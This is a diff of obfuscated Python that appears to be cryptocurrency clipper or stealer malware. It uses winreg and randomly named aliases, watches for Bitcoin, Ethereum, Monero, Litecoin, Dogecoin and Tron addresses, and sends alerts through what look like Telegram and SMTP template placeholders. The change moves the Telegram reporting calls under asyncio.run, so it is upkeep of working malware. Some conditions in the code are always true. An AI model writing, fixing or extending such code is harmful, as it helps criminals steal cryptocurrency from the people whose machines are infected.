@@ -15,6 +15,7 @@ import shutil as euifew
 import sys as wzf8u4w7
 import winreg as ef9uh77 
 import threading as wefuh4323
+import asyncio as nueia8732q
 
 xwwwrew = '%Brgxer%'
 dsfrsdjk = '%Zrxgre%'
@@ -182,7 +183,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=redugh8(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != '' or ' ' or '%tele%':
-                wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()
+                wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1))).start()
 
             if regh54 != '' or ' ' or '%smtp%':
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -200,7 +201,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=redugh8(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != '' or ' ' or '%tele%':
-                wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1)).start()
+                wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1))).start()
 
             if regh54 != '' or ' ' or '%smtp%':
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -219,7 +220,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=redugh8(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != '' or ' ' or '%tele%':
-                wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1)).start()
+                wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1))).start()
 
             if regh54 != '' or ' ' or '%smtp%':
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -237,7 +238,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=redugh8(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != '' or ' ' or '%tele%':
-                wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1)).start()
+                wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1))).start()
 
             if regh54 != '' or ' ' or '%smtp%':
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -256,7 +257,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -270,7 +271,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -284,7 +285,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
@@ -300,7 +301,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=redugh8(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != '' or ' ' or '%tele%':
-                wefuh4323.Thread(target=egreger453645(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1)).start()
+                wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1))).start()
 
             if regh54 != '' or ' ' or '%smtp%':
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1)).start()
